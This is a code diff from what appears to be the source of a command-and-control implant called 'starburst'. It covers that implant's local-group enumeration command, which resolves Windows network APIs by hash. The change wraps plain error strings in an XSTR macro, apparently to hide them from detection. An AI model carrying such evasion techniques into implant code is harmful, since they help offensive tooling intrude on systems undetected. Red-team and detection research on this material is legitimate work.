@@ -28,7 +28,7 @@ auto declfn starburst::cmd_net_localgroup(
     auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
+            XSTR( "LoadLibrary netapi32 failed" ) );
         return;
     }
 
@@ -40,7 +40,7 @@ auto declfn starburst::cmd_net_localgroup(
             expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetLocalGroupEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -66,7 +66,7 @@ auto declfn starburst::cmd_net_localgroup(
 
     if ( status != 0 && status != 234 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NetLocalGroupEnum failed" ) ) );
+            XSTR( "NetLocalGroupEnum failed" ) );
         return;
     }
 
@@ -75,7 +75,7 @@ auto declfn starburst::cmd_net_localgroup(
     if ( !output ) {
         pNetApiBufferFree( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
